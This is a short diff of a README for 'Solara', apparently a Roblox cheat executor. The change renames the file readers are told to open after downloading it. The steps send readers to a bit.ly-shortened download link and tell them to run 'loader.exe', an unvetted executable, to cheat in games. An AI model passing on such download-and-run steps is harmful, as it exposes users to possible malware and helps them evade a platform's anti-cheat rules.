@@ -19,7 +19,7 @@ Ever thought what will happpen if Roblox detect Solara? Well, we are always here
 🌌How to install Solara
 [Download Link](https://bit.ly/3ZmBEFM)
 
-Open file script.exe
+Open file loader.exe
 
 Find script for your game
 
